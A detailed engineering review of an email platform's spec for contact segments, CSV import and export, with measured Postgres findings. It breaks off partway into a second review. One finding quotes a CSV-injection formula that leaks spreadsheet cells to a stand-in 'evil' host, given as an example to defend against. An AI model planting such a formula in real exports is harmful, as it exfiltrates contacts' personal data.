# Review — M1b segments, import and export

Reviewed: `.scratch/email-platform/specs/2026-11-12-m1b-segments-and-import.md`, 2026-11-12.
Against `spec.md`, the M1a spec, `m1a-decisions.md`, ADR 0003, and the code in `src/` and
`migrations/`. Every claim marked **measured** was run against Postgres 16.15 in `nm-postgres-1`;
the SQL is reproduced so it can be re-run.

---

## Verdict

**Needs rework** — but a narrow rework, of three sections and the scope, not of the milestone's
idea. The AST, the whitelist, the parameterisation and the `remove` → `unsubscribe` rename are
sound and could be planned today. Four things cannot:

1. **§10's central guarantee is false in two independent ways.** It is broken by every negative
   operator, and it is broken by any concurrent transaction — including the importer this very
   milestone builds, which is the write issue `04` was filed about. §10 is the section that
   closes the blocking issue, so this is not a detail.
2. **§6's index plan does not serve the SQL §4.4 emits.** Measured: the GIN index is never used by
   an attribute rule. It is pure write cost on the one column every contact update touches, which
   is exactly what migration 0011 refuses to do and says why.
3. **Two unspecified paths resolve to "every contact in the workspace."** An empty `rules` array
   and a deleted `segment_id`. Both end at `bulk/delete`. This is the M1a all-`None` filter with a
   new spelling, and M1a's record says that near-miss happened three times.
4. **The scope is 22–26 tasks.** M1a was 17 and that was stated as the limit. The seam is between
   §6 and §7 and it is clean.

Fix those four and the rest of the findings below are ordinary spec edits.

---

## Technical claims, verified

### §4.4 — a bound attribute key. **Confirmed, with one caveat worth writing down.**

```
PREPARE p1 AS select '{"a":1}'::jsonb ->> $1;
select name, parameter_types from pg_prepared_statements;   -- p1 | {text}
```

`->>` has two candidates (`jsonb ->> text`, `jsonb ->> integer`), so ambiguity was the plausible
failure. Postgres resolves an `unknown` parameter to the preferred type of the string category,
`text`, and prepares cleanly. `?` resolves the same way, and the codebase already relies on it —
`purge_custom_field` runs `where workspace_id = $1 and attributes ? $2`
(`src/custom_fields/routes.rs:384`). So §4.4's claim holds: no attribute key ever becomes SQL
text.

The caveat: this holds because sqlx sends the parameter typed as `text` (or untyped, which
resolves to `text`). If the compiler ever binds a key through a type that infers to anything else,
the operator resolves to the array-index overload and the rule silently reads the wrong thing.
Bind keys as `&str`/`String` and say so in §4.4.

### §6 — `jsonb_path_ops` and `is_set`. **Confirmed, but the remedy in §17 is the wrong one, and §6 understates the problem by a lot.**

Measured on 200,000 rows:

| Predicate | `gin (attrs jsonb_path_ops)` | `gin (attrs)` (default) | `btree ((attrs ->> 'plan'))` |
|---|---|---|---|
| `attrs @> '{"plan":"pro"}'` | Bitmap Index Scan | Bitmap Index Scan | — |
| `attrs ->> 'plan' = 'pro'` | **Parallel Seq Scan** | **Parallel Seq Scan** | Index Scan |
| `attrs ? 'plan'` | **Parallel Seq Scan** | Bitmap Index Scan | — |

Index sizes on the same data: default GIN 7,896 kB, the expression index 1,368 kB.

So §6 is right that `jsonb_path_ops` cannot serve `?`, and §17's "a second index with the default
opclass may be cheaper" would indeed fix `is_set`. But that is the small half of the problem. The
compiler emits `attributes ->> $n` for **every** attribute rule (§4.4), and **no GIN index of
either opclass serves `->>`**. The index added in migration 0017 is therefore never used by any
rule the compiler writes. §6 justifies it as "faster for the containment queries segment rules
generate"; §4.4 generates no containment query.

What I would do instead, in order of preference:

- **Create a btree expression index per custom field key**, when the definition is created, and
  drop it when the field is purged. The key is a validated identifier out of `custom_fields`, so
  the DDL literal is safe — this is identifier text at DDL time, not caller text at query time,
  and it does not weaken §4.4. Measured: index scan on `eq`, one fifth the size of the GIN index,
  and it fixes the estimate problem in §5 as a side effect (see below). It does not help
  `contains`, so leave that to the trigram/scan path.
- Additionally, compile `eq` on text/select/boolean/number to `attributes @> jsonb_build_object($k, $v)`
  if you want to keep one GIN index, which is the only shape that uses it (both binds parameterised).
- Drop `contacts_attributes_gin` from 0017 unless one of the two above is adopted. M1a's migration
  0011 comment — "one would defeat HOT updates on a column every update touches" — is still true,
  and M1b is about to run 1M-row imports through that column.

### §5 — `SET LOCAL statement_timeout`. **Confirmed it cannot leak. Three things §5 does not say.**

```
begin; set local statement_timeout = '100ms';
select count(*) from t, pg_sleep(0.3);   -- ERROR: canceling statement due to statement timeout
select 1;                                -- ERROR: current transaction is aborted
rollback;
select current_setting('statement_timeout');  -- 0
```

- It reverts on rollback, so it cannot reach another request. Correct.
- **`SET LOCAL` outside a transaction is a `WARNING`, not an error**, and the setting stays `0`.
  So a preview that acquires a pooled connection and runs `set local …` without `begin` has **no
  timeout at all** and hangs instead. The §15 test as written ("a timed-out preview is followed by
  a normal query not subject to the short timeout") passes vacuously in exactly that case, because
  no timeout was ever set. The test must also assert the preview actually timed out. M1a found
  nine vacuous assertions; this is the shape of the tenth.
- **After the timeout the transaction is aborted.** The `EXPLAIN` fallback cannot run on the same
  transaction; it needs a fresh one. §5 reads as if it continues.

### §5 — `EXPLAIN (FORMAT JSON)` as a fallback. **It gives a number. The number is not usable.**

Measured, 200,000 rows, true count of `attrs ->> 'plan' = 'pro'` is **66,666**:

- With no expression index: top node `Aggregate`, `"Plan Rows": 1`; descending, `Gather` is also
  `1`; the `Seq Scan` says `"Plan Rows": 588` — **per worker**. The honest total at the `Gather` of
  the equivalent row-producing select is **1,000**.
- With the expression index: `"Plan Rows": 66300`.

Two separate problems:

1. **Mechanics.** `EXPLAIN` of a `count(*)` puts `Plan Rows: 1` at the top and at every node down
   to the scan, and the scan's number is per-worker under a parallel plan. Explain the
   row-producing select (`select 1 from contacts where …`) and read the **top** node. Say that in
   §5; a naive `Plan["Plan Rows"]` returns 1 and a naive descent returns a per-worker number.
2. **Accuracy.** 1,000 against a truth of 66,666 is 66× low. §17 frames this as "only as good as
   `ANALYZE`". It is not an `ANALYZE` problem: Postgres has no statistics for `->>` on a key unless
   an expression index or `CREATE STATISTICS` exists, so it applies a default selectivity. More
   `ANALYZE` will never improve it. And the rules that hit the 1,500 ms timeout are precisely the
   jsonb rules whose estimate is meaningless — the fallback is worst exactly where it is used.
   Either adopt the per-key expression index (which measured 66,300 against 66,666), or do not
   render a planner number as a count: `~1,000` where the truth is 66,666 is worse than "too many
   to count exactly".

### §7.2 — `COPY` into a temp staging table. **The shape works. One hard blocker, measured.**

- Temp table `on commit drop` is dropped on commit, confirmed; it is session-private so it is safe
  on a pooled connection as long as the whole import runs on one `sqlx::Transaction`, which it
  does. The per-import name `import_staging_<id>` is unnecessary catalog churn — a fixed name is
  private to the session anyway.
- **`ON CONFLICT … DO UPDATE` errors on a duplicate key inside the same command.** Measured:
  `ERROR: ON CONFLICT DO UPDATE command cannot affect row a second time` (SQLSTATE 21000).
  §7.3 treats "duplicates within the file are last-wins" as a reporting nicety. It is a hard
  precondition of §7.2's single statement: one duplicate address in a 1M-row file aborts the whole
  import after two minutes with a Postgres error string. The upsert must select
  `distinct on (normalised_email) … order by normalised_email, row_number desc`, or dedupe in Rust
  while streaming. And it must dedupe on the **normalised** email, which only Rust knows, so
  staging has to carry it.
- Throughput: 1M rows in under two minutes is plausible for `COPY` plus one set-based upsert on
  the reference box — `COPY` alone does low-millions per minute, and the upsert is one index probe
  per row. Two things will eat the budget and are not accounted for: the GIN index on `attributes`
  (if it survives review), which is maintained per row, and the per-row HMAC the erasure check
  needs (§7.5). Measure with the index in place, not without.

---

## §10 — the subset claim. Asked for plainly, answered plainly.

**The guarantee is overstated.** It holds for predicates that are monotone in the facts they read.
It does not hold for any negation over a joined fact, and it does not hold against a concurrent
transaction at all.

### The negation case you were least sure of

Take `not_has X` compiled as `NOT EXISTS (… and created_at <= t)`.

- **A tag added after `t`.** The bounded `NOT EXISTS` still matches and the contact is still acted
  on. **This is subset-correct.** The contact had no such tag at `t`, so the rule matched at `t`,
  so the person saw it. Acting on someone who was shown is the guarantee, and it is kept. It may
  feel wrong — the contact now carries the tag the rule was excluding — but that is the ordinary
  cost of a snapshot, and the alternative (an unbounded `NOT EXISTS`) would exclude it, which is
  under-inclusion, not an improvement in kind.
- **A tag removed after `t`.** The bounded `NOT EXISTS` also matches — and now it is **not**
  subset-correct. The contact had the tag at `t`, so the rule did not match at `t`, so the person
  never saw it. It is acted on anyway. This is over-inclusion, which is the failure §10 exists to
  eliminate.

Measured:

```sql
create table ct (contact_id int, tag_id int, created_at timestamptz);
insert into ct values (1, 99, '2026-01-01 11:00');   -- C1 HAS tag 99 at t = 12:00
select not exists (select 1 from ct
                   where contact_id=1 and tag_id=99 and created_at <= '2026-01-01 12:00');  -- f
delete from ct where contact_id=1 and tag_id=99;     -- the tag is removed after t
select not exists (select 1 from ct
                   where contact_id=1 and tag_id=99 and created_at <= '2026-01-01 12:00');  -- t
```

§10's second bullet — "a fact **removed** after the token leaves no row, so the contact is not
matched either … that is *under*-inclusion" — is true for a positive rule and **exactly backwards
for a negative one**. The sentence is the error.

### The same inversion on `not_member_of`, caused by the maintenance §10 mandates

`list_memberships` keeps its row on unsubscribe, so the bound is on `updated_at`, and §10 requires
every status write to move it. That requirement is what breaks the negative:

```sql
insert into lm values (1, 7, 'subscribed', '2026-01-01 11:00');
select not exists (select 1 from lm
                   where contact_id=1 and list_id=7 and updated_at <= '2026-01-01 12:00');  -- f
update lm set status='unsubscribed', updated_at='2026-01-01 13:00' where contact_id=1;
select not exists (select 1 from lm
                   where contact_id=1 and list_id=7 and updated_at <= '2026-01-01 12:00');  -- t
```

A contact who was on list 7 when the person looked, and unsubscribed afterwards, is pulled into a
`not_member_of 7` action they were never shown in. On this product that is the worst available
direction: the predicate "people not on the list" is the one an operator uses to re-solicit.

**Why no time bound can fix a negation.** Subset-correctness for `¬P` requires proving the fact was
*absent* at `t`. Deletion destroys the evidence of presence, and a status overwrite destroys it
just as thoroughly. Nothing reconstructable from the rows that still exist can distinguish "never
had it" from "had it and lost it". This is a property of the approach, not a bug in the SQL.

### The second break: a timestamp is not a commit order

Also measured, and this one defeats both the new `as_of_time` bound and M1a's existing
`id <= as_of`:

```
session A:  begin; insert into facts default values;   -- created_at = now() = 15:50:39.96
            select pg_sleep(6); commit;                -- commits at 15:50:45
session B:  (at 15:50:42.97) count(*) from facts  -> 0 rows visible   -- token issued here
afterwards: token_time          = 15:50:42.976997
            row created_at      = 15:50:39.961747
            passes as_of bound  = 1
```

The row was **invisible when the token was issued**, carries a `created_at` three seconds **before**
the token, and therefore passes `created_at <= as_of_time`. `now()` is transaction start, not
commit. Any transaction in flight at token issue that commits before the action writes facts that
sail through the bound.

§7.2 specifies the import as one transaction of up to two minutes. Issue `04` was filed as
"blocking for M1b's importer", because the importer is what makes the swap routine — and the
proposed fix fails against the importer specifically. The same hole exists in the `id <= as_of`
bound if contact ids are minted in Rust while streaming into `COPY`, which §7.2 implies: a v7 id
minted at transaction start is below an `as_of` taken a minute later.

Clock skew is a third, smaller version of the same thing: §10 never says which clock
`as_of_time` comes from. If it is Rust's and the app is on a different host from Postgres, a fast
app clock admits rows written after the token.

### What I would do

Pick one and write it down; do not leave §10 claiming "always".

1. **State the truth and narrow the issue.** The guarantee becomes: *subset-correct for positive
   rules and contact-column rules, provided no transaction that wrote a relevant fact was in flight
   at issue time.* Issue `04` stays open, narrowed to negations and concurrent writers. This is
   free and it is honest, and it is the minimum acceptable outcome.
2. **Take `as_of_time` from the database**, as `select now()` on the issuing connection, not from
   Rust. Required under every option; costs nothing.
3. **Materialise the id set for the actions that refuse.** §10 rejects materialisation because it
   "costs a write of up to 10M rows on a preview the user may never act on" — but the write would
   not be on a preview. `POST /contacts/selection` is already an explicit act (editor role, called
   when the user asks to select everything matching), not a keystroke. Materialising there, with a
   reaper and a cap, is exactly correct for `bulk/delete` and `bulk/subscribe`, which are the two
   that matter. The preview path (§5) stays live and unmaterialised. I think the rejection in §10
   is arguing against a cost the design does not actually incur, and it is worth re-deciding before
   building the fact bound, because the fact bound is three indexes and a compiler branch for a
   property it does not deliver.
4. If you keep the time bound anyway: **do not bound negatives at all**, document that negatives
   are not snapshotted, and refuse a segment containing a negative operator as the target of
   `bulk/delete`/`bulk/subscribe`. Under-inclusion on positives is tolerable; silent over-inclusion
   on negatives is the compliance bug.

A last cost nobody has priced: `contacts.updated_at <= t` excludes a contact edited for any
unrelated reason. `purge_custom_field` sets `updated_at = now()` on **every** contact holding the
key (`src/custom_fields/routes.rs:384`), and the importer will touch most rows in the workspace.
After either, every outstanding selection over a segment reading a contact column resolves to
nearly nothing, and the UI says "some contacts changed after you selected them and were left
alone" about 100% of the selection. That message needs a floor, or the user will act on an empty
set and believe they acted.

---

## Findings by severity

### S1 — §4.1, §4.2: two unspecified routes to "every contact in the workspace"

**(a) An empty rules array.** `{"match": "all", "rules": []}` — the conjunction of nothing is
TRUE, so the segment matches every contact. Under `"any"` it is FALSE. The spec never says which,
and a rule builder produces an empty group every time someone removes the last rule from one. Put
it through `bulk/delete` and it is M1a's all-`None` filter again, which the decision record says
nearly destroyed a workspace three times.

Do: `422` at parse for an empty `rules` at the top level **and** in any group, and state that the
compiler has no code path that can emit an unconstrained predicate. Pin it with a test that asserts
the resolved SQL always carries at least one restriction beyond `workspace_id`.

**(b) A `segment_id` that does not resolve.** Deleted, or from another workspace. If the compiler
treats "no rules found" as "no constraint", same outcome. §4.8's `segment_version` check does not
cover it: a deleted segment has no stored version to differ from.

Do: an unresolvable `segment_id` is `404`, never an empty predicate. And say what `DELETE /segments/{id}`
does to outstanding tokens (`409 segment-changed` is the natural answer, or refuse the delete).

### S2 — §10: the subset guarantee (above)

### S3 — §6 vs §4.4: the index does not serve the compiler's SQL (above)

### S4 — §5: the estimate can be two orders of magnitude wrong, and `ANALYZE` cannot fix it (above)

### S5 — §7.2: `ON CONFLICT DO UPDATE` aborts on a duplicate inside the file (above)

### S6 — §7.4: the import cannot run as described

- **"Imports run in the request's own task."** axum drops the handler future when the client
  disconnects, so closing the tab, a proxy timeout, or a flaky connection kills a two-minute import
  mid-transaction. It must be a detached `tokio::spawn` with its own pooled connection; the request
  returns `202` and the client polls `GET /imports/{id}`, which is what §12's API shape already
  implies. Fixing this also makes the sentence "when the worker lands, this is a substitution, not
  a rewrite" true — as written it is not, because the worker's shape is detached and this one is not.
- **Progress cannot be observed.** §13 promises a progress step. Counts written inside one open
  transaction are invisible until commit, so the wizard shows a spinner for two minutes and then a
  result. Either commit in batches (which also bounds the §10 exposure window) or drop progress and
  say the states are pending/running/done.
- **`import_errors` dies with the transaction.** §7.2 writes failures "inside SQL" in the same
  transaction as the upsert. If that transaction aborts — a duplicate (S5), a timeout, a
  disconnect — the per-row report, which is the deliverable, is rolled back with it. Errors must be
  committed independently of the upsert.
- **The advisory lock must be `pg_advisory_xact_lock`.** `pg_advisory_lock` is session-scoped.
  `src/db.rs` builds the pool with `PgPoolOptions::new().max_connections(20)` and no
  `after_release`, and sqlx issues no `DISCARD ALL`, so a session lock taken on a pooled connection
  survives the request on a connection handed to someone else. One crashed import and that
  workspace can never import again until the process restarts. The transaction-scoped variant
  releases on commit **and** on abort, which is what the sweep in §7.4 is trying to approximate.
- A two-minute transaction holds 1 of 20 connections and pins the oldest xmin, which stops vacuum
  across the whole database for its duration. Worth one line in §7.4 next to the 1M cap.

### S7 — §7.2, §7.5: the import bypasses the Rust write path and the spec does not say how the guards survive

`src/contacts/mod.rs` states it outright: *"Every write path into `contacts` must go through this
function or re-check `suppressions::is_erased` itself: the erasure guard lives here, so a bulk
`INSERT` elsewhere bypasses it silently."* The set-based upsert is that bulk INSERT. Each of these
needs a sentence:

- **Erasure.** The check is an HMAC computed in Rust (`suppressions_lookup_hmac`). Staging must
  carry the HMAC per row, and the upsert must anti-join against live erasure tombstones. §7.5
  requires the refusal; nothing says how it is expressed set-based.
- **Ids must be `Uuid::now_v7()` minted in Rust.** Both `contacts/mod.rs` and `selection.rs` record
  that a non-v7 id escapes the `as_of` bound entirely and can be acted on by a selection made
  before it existed. If staging takes `gen_random_uuid()` in SQL because it is convenient, every
  selection snapshot silently breaks and no test will notice.
- **`contacts.updated_at` must be set on every updated row**, or §10's `contacts.updated_at <= t`
  bound reads a stale value for the exact writes it exists to catch.
- **Attribute validation must not be reimplemented in SQL.** §7.2 proposes validating numeric
  attributes there. `validate_attributes` in Rust already enforces select options, date and
  datetime canonicalisation, `multi_select` distinctness, the 2,000-character text cap and the
  archived-field refusal. §4.3 says the `::numeric` cast on the read path is safe *only because*
  that function holds on the write path — so a second, weaker implementation on the import path
  breaks the segment compiler, not just the import. M1a's own lesson: "two copies of a helper
  drift." Validate in Rust during the `COPY` stream; you touch every row there anyway.
- **Which subscribe semantic?** The two existing ones already disagree. `lists::add_member`
  **resurrects** an unsubscribed membership (`on conflict … do update … where
  list_memberships.status = 'unsubscribed'`, `src/lists/mod.rs:145`); `selection::subscribe` does
  `do nothing`. §7.5 forbids resurrection, so the import follows `selection::subscribe`. Say it, or
  someone reuses `add_member` because it is the function named "add a member".
- **Double opt-in is missing from §7.5.** `add_member` writes `pending` on a `double_optin` list.
  An import that writes `subscribed` to a double-opt-in list manufactures the confirmation the list
  requires. That is the compliance failure §7.5 is about, and it is the one §7.5 does not list.
- **§10's "every status write goes through `selection::*` or `lists::*`" stops being true in this
  milestone.** The import is a third writer, and M1c adds forms and the preference center. Either
  name the import in that sentence or re-open the trigger question.

### S8 — §8: CSV injection on export is not handled

Confirmed absent. A contact whose `first_name` is `=HYPERLINK("http://evil/?x="&A1,"click")` becomes
a live formula when the operator opens the export in Excel, Sheets or LibreOffice. The operator is
an admin, the sheet is a workspace's whole contact list, and the payload arrives through a field
any signup form can set. This is the one injection in this spec that reaches a human.

Do: prefix any cell whose first character is `=`, `+`, `-`, `@`, tab or carriage return with a
single quote (or wrap in quotes and prefix), pin it with a test, and apply the same rule to the
**downloadable per-row error CSV in §13**, whose entire purpose is to echo the operator's raw cells
back at them. §15 has an injection test for SQL; it needs the sibling for CSV.

### S9 — §4.5: the negation rule is right about joins and silent about NULLs

"Negation is `NOT EXISTS`, never `!=`" is correct for `tag` and `list`, which are joined facts.
For a column on `contacts` there is nothing to anti-join: `not_contains` on `email` is
`not (email ilike …)`. The trap there is three-valued logic, not the join shape —
`timezone not ilike '%x%'` evaluates to NULL, not TRUE, for a contact with no timezone, so "whose
timezone does not contain X" silently drops every contact without one. `first_name` and
`last_name` are `not null default ''` and are safe; `timezone` and every `attr:` key are not.

Do: restate the reviewer check as *for every negative operator, a contact with zero related rows
**or a NULL/absent value** must match*. §15's "negation over absence" test should cover both halves.
Also say whether `is_not_set` on a text field counts `""` — §4.5 names missing-key and JSON `null`
and stops there.

Related, §4.3: `(attributes ->> $n)::numeric` errors for the whole query if any row holds a
non-numeric value under that key — and a key can acquire one by being archived, purged and
re-created with a different kind, which the current routes permit. The guarded form is
`jsonb_typeof(attributes -> $n) = 'number' and (attributes ->> $n)::numeric > $v`. §4.3 names the
risk and then relies on a coupling that the archive/purge/recreate path can break.

### S10 — §4.8: the token payload changes and nothing says to bump the signing label

`ContactFilter` gains `segment_id`; `Selection` gains `as_of_time` and `segment_version`. M1a's
decision record states the mechanism for any change to the payload's meaning: bump
`SELECTION_DOMAIN` (`nm:selection:v2` → `v3`), *"chosen over accepting uncounted tokens so that no
token can skip the widening check."* A v2 token carrying no `as_of_time` would otherwise need a
default, and the only available default is "no bound" — the precise failure the milestone is
built to prevent.

Do: §4.8 says the label goes to `v3`, the new fields carry no `serde(default)`, and the rolling-deploy
note from `ContactFilter`'s doc comment applies.

### S11 — §4.8 does not revisit the tag/untag split, which ADR 0003 assigns to this milestone

ADR 0003: *"`tag` sits on the reporting side only because nothing mails a tag today … The moment
M1b lets one target a tag or a segment expression, tagging manufactures consent by exactly this
argument and the split has to be revisited. **Decide that with the segment work, not after it.**"*
`m1a-decisions.md` repeats it. §4.2 makes `tag` a first-class segment field and §4.7 says M2 will
target a segment, so the condition is met — and §4.8 discusses token invalidation without
mentioning the split.

Do: decide in §4.8. Either `bulk/tag` joins delete and subscribe on the refusing side, or state the
argument for why it does not. A dated obligation in an accepted ADR is not optional.

### S12 — §5/§8.2 interaction: `issued` must be exact and §5 never says so

`selection::count` runs the same predicate as the preview, so on a 10M-contact segment it is
exactly the query §5 expects to exceed 1,500 ms. If `POST /contacts/selection` reuses the preview's
fallback, the number signed into the token — the sole bound the entire widening guard rests on —
becomes a planner estimate that measured 66× low. A low `issued` refuses everything; a high one
admits a widening.

Do: state that `issued` is always exact, that `POST /contacts/selection` has its own longer timeout
and refuses with a named error rather than estimating, and that the UI does not offer "select all
matching" while only an estimate is available.

### S13 — §5/§9: the preview is an availability hole at viewer role

`POST /segments/preview` runs an arbitrary rule document, at viewer role, for up to 1,500 ms of
backend time, fired per keystroke by a debounced builder, with no concurrency cap. The pool is 20
connections (`src/db.rs`). Twenty keystrokes across two users is the whole pool for a second and a
half. There is no rate limiting anywhere in the product except `auth::rate_limit` on login, and
`spec.md`'s API conventions promise per-key rate limits with `RateLimit` headers.

Do: cancel the in-flight preview per session, cap concurrent previews per workspace, and say which.
This is the first milestone where the absence of rate limiting is an availability bug rather than
an unkept promise.

### S14 — §6: a dangling reference, and the retention rule it promises does not exist

§6 says `import_errors.raw_value` "is deleted with its import and **§8.5** caps how long an import
row is kept." There is no §8.5. §8 has no subsections and no retention rule appears anywhere.

Missing with it: a byte cap on the upload (distinct from the 1M-row cap — one row can be a
megabyte), where the "temporary path" is, who deletes the file when the run ends or crashes, and a
retention window with a sweep for `imports` and `import_errors`. Also: a GDPR erasure of a contact
does not reach `import_errors.raw_value`, so an erased address survives in an error report — the
same class as open issue `02`.

### S15 — §6: schema details

- **`import_errors` primary key `(workspace_id, import_id, row_number, message)`.** `message` is
  unbounded text in a btree key: over 2,704 bytes the insert fails, and two errors on the same row
  with the same text but a different `column_name` collide and one is lost. Use a surrogate `id`
  with an index on `(workspace_id, import_id, row_number)`, and cap errors stored per import — a
  1M-row file of garbage is 1M error rows written inside the import's own budget.
- **`imports` has no progress column and no `updated_at`**, though §13 shows progress.
- **The three new indexes in 0017/0018 do not serve §10's queries.** The bounds appear inside
  correlated `EXISTS` per contact: the lookup is `(contact_id, tag_id)` and then a filter on
  `created_at`. `contact_tags (workspace_id, created_at)` cannot serve that, nor can
  `list_memberships (workspace_id, updated_at)`. And `contacts (workspace_id, updated_at)` with
  `updated_at <= now()` matches nearly every row, so the planner will not choose it. As specified
  these are three write-amplifying indexes for no read. If the bound survives, the useful shapes
  append `created_at`/`updated_at` to the existing composite indexes.
- `segments.rules` has no size bound at the database; one `check (pg_column_size(rules) < 65536)`
  costs nothing and backs up the parse limit.

### S16 — §12: merge-patch on `rules` is a footgun, and "only when rules actually changes" needs a definition

RFC 7386 merges objects recursively. `{"rules": {"match": "any"}}` flips the connective and
silently keeps the stored rule array; `{"rules": {"rules": [...]}}` replaces the array and keeps
the old `match`. A predicate document should be replaced whole.

Do: require the complete `rules` document whenever `rules` is present. And define the version bump
as `rules is distinct from $new::jsonb` — a text comparison bumps the version on a reformat,
because jsonb reorders keys and drops duplicates, and §12's "a rename must not invalidate every
outstanding token" test will not catch that.

### S17 — §8: export is admin-only, which is reasonable but does not do what §8 says it does

Keep it admin-only; the reasoning is sound and the audit row is worth having. But state the
asymmetry, because a reviewer will find it: an **editor** can `bulk/delete` every contact in the
workspace (`src/contacts/routes.rs`, `Role::Editor`) and can page the entire book out through
`GET /contacts` at 100 rows a request with no rate limit. So admin-only export raises the cost of
casual exfiltration and creates an audit point; it does not stop "taking the whole book out of the
building", which is what §8 claims. Two things would make the claim true: rate-limit the paged read,
and treat §13's import-error CSV download (editor role, `raw_value` holds personal data) as an
export as well. It will not block legitimate work — admins exist in every workspace and the audit
row is the point.

---

## Missing entirely

Checked each one you named, plus what the sweep turned up.

- **Idempotency.** Zero hits for `Idempotency-Key` in the codebase and none in §12, although
  `spec.md`'s API conventions require it on every creating POST. `POST /imports/{id}/start` is the
  one that matters: a client retry after a gateway timeout must not start a second run. Today the
  advisory lock would return `409`, which happens to be correct — say so deliberately, or add the
  key. `batchUpsert` is naturally idempotent on `(workspace_id, email)`; `POST /segments` is not.
- **Rate limiting.** Nothing outside login. S13.
- **A custom field purged rather than archived.** The path exists: `purge_custom_field` (admin,
  requires archived first) deletes the key from every contact. §4.2 covers archived and is silent
  on purged. After a purge, `attr:key` names no definition, so §4.2 makes every stored segment
  using it `422 unknown-field` — un-previewable, un-actionable, with no repair path in the UI.
  Decide: refuse the purge while any segment references the key (one `exists` query over
  `segments.rules`), or give the segment a readable `broken` state that names the field. Note also
  that the purge sets `updated_at = now()` on every affected contact, which under §10 invalidates
  every outstanding selection over a segment reading a contact column.
- **A workspace deleted while an import runs.** `imports.workspace_id` is `on delete cascade`, so
  the delete blocks on the import's row locks or the import's final INSERT fails on a vanished FK
  target. Unspecified. One line: the import fails with a stated reason, or the workspace delete
  takes the same advisory lock.
- **CSV injection on export.** S8.
- **The NDJSON and CSV streaming import** is in §1 and §12 and is designed nowhere. §7 describes
  only the upload-then-start wizard. Which endpoint streams, does it share the staging path, does
  it hold the advisory lock, is it bounded at 1M too? Right now it is a line item with no section,
  and it is the path the Interspire importer is supposed to reuse in M6.
- **`POST /contacts:batchUpsert`** is likewise one line and never specified. It must enforce §7.5's
  three refusals, the de-duplication modes, the erasure check and the double-opt-in status, or it
  is a second, weaker import. It is also the endpoint an API client will actually use.
- **Export format.** Delimiter, encoding (Excel mangles UTF-8 without a BOM), newlines inside
  values, and how a `multi_select` renders in a cell. The export is the file an operator edits and
  imports back, so export and import must agree on the encoding of `lists`, `tags` and
  `multi_select` or the round trip loses data silently. Nothing says they do.
- **Import cancel.** `imports.status` permits `'cancelled'`; no endpoint sets it and a single
  in-flight transaction cannot be cancelled cooperatively. Either add the endpoint (easy once S6's
  detached task lands and the work is batched) or drop the value from the check constraint.
- **Mapping to a tag.** §7.5 says an import may add tags; §7.1's mapping step offers "contact field
  or custom field" only. Where does a tag come from?
- **Creating custom fields during an import.** Not stated either way. An operator with a 40-column
  CSV expects it. Refusing is a fine answer; silence is not.
- **Consent provenance on an imported membership.** See the deferrals section — this is the one I
  would not let slip.

---

## Deferrals (§1 and §14)

Right to defer, no argument: engagement rules (there are no events), the Interspire and listmonk
importers (M6, and they reuse this path), AI-segment-from-a-sentence (it genuinely needs the AST
stable), the background worker.

Painful to retrofit, in order:

1. **Consent provenance on an imported membership.** `consent_log` is M1c, but this milestone
   writes memberships in bulk with nothing recording source, file, actor or time beyond
   `subscribed_at`. After M1c you have N million memberships with no consent row and no way to
   backfill one — and "where did this subscription come from" is the first question an auditor
   asks, and the first thing a complaint escalation needs. The cheap version is one column:
   `list_memberships.source text` (or `import_id uuid`), written by the import and by
   `selection::subscribe`. One migration, one column, no new concept, and M1c's consent log can
   then be built on top of a record that exists. Deferring the feature is fine; starting to write
   the rows without it is not.
2. **The import's double opt-in semantics** (S7). Deferring double opt-in as a *feature* to M1c is
   fine. Deferring the *decision* is not, because M1b is writing membership statuses onto
   `double_optin` lists in the meantime, and whatever it writes is what M1c inherits.
3. **In-process imports** are fine to defer *if* §7.4 is corrected to a detached task (S6). As
   written — "the request's own task" — the worker is not a substitution, because a detached job
   with polling is a different shape from a long-held request, and the API, the UI and the error
   handling all change with it. Correct §7.4 and the deferral becomes what it claims to be.

---

## Scope: two milestones

Count what is here: four migrations; the AST, the compiler and its injection/negation/typo tests;
segments CRUD; the preview with the timeout-and-estimate path; the selection integration
(`segment_id`, `as_of_time`, `segment_version`, the label bump, the widening interaction); §10's
fact bound and its fallout; the `remove` → `unsubscribe` rename across route, two functions, the
audit action, OpenAPI, the UI and the glossary; the import — upload, sniff, map, run, report —
which is five tasks before the staging/`COPY`/dedupe core; NDJSON and CSV streaming; `batchUpsert`;
export; and five UI surfaces (segments list, rule builder, import wizard, import report, export
trigger), each needing the break harness, axe at 320 px and 200% zoom, and a Playwright path.

That is **22–26 tasks**. M1a was 17 and the brief says 17 was the limit.

**The seam is between §6 and §7, and it is clean.** Segments and import share nothing but
`ContactFilter` and the conventions. Split:

- **M1b — segments.** The AST and compiler, segments CRUD, preview and the estimate path, the §10
  work on issue `04` (whatever it becomes after the rework above), the issue `08` rename, export,
  and two UI surfaces. Export belongs here: same filter, three days, and it gives the milestone a
  shippable end.
- **M1c — import.** CSV, NDJSON and `batchUpsert`; staging and `COPY`; de-duplication; the §7.5
  refusals; the wizard and the report. (Renumber the double-opt-in milestone accordingly.)

This is also the right dependency order, for a reason the spec itself supplies: issue `04` is filed
as blocking **for the importer**, because an import that retags a segment is the write that performs
the swap. Splitting forces the fact bound to land, be tested and be proven *before* the importer
exists. Kept as one milestone, §10 is task 6 and the importer is task 14, and the first real test of
§10 arrives after everything has been built on it.

---

## Consistency with M1a and `spec.md`

Good: migration numbering and style, `unique (workspace_id, id)` on both new tables, composite
foreign keys on `import_errors`, `deny_unknown_fields` everywhere, RFC 9457 and 7386, cursor
pagination, 404-before-403, keyset indexes, the audit row that records the filter but not `q`, the
refusal to rewrite historic audit action strings, and the §15 insistence that every assertion be
shown to fail against broken code.

Gaps, all noted above: the signing-label bump (S10), the ADR 0003 tag decision (S11), the second
implementation of attribute validation (S7), the two subscribe semantics that already disagree
(S7), `Idempotency-Key` against `spec.md`'s stated conventions, and `RateLimit` headers likewise.

On the budgets: §5's 1,500 ms against `spec.md:457`'s p95 < 2 s leaves room for the fallback only
if the `EXPLAIN` runs on a fresh transaction and is itself cheap — it is, but say it. §7.2's 1M in
under two minutes (`spec.md:459`) is plausible and must be measured with the `attributes` index in
place, not without. §14's four recorded deviations are the right four; add a fifth for whatever
§10 becomes, because "the resolved set is a subset of what the user saw" as currently written is a
claim `spec.md` will be read as carrying.

---
---

# Second review — `2026-11-12-m1b-segments.md` (the rework)

Reviewed 2026-11-12, after the rework. Same method: measured where a measurement settles it, on
Postgres 16.15 in `nm-postgres-1`. Everything above this line refers to the superseded draft and
stays for the record.

## Verdict: ready after these changes

**§8 survives.** I attacked it the way I attacked §10 and could not break the core. Materialisation
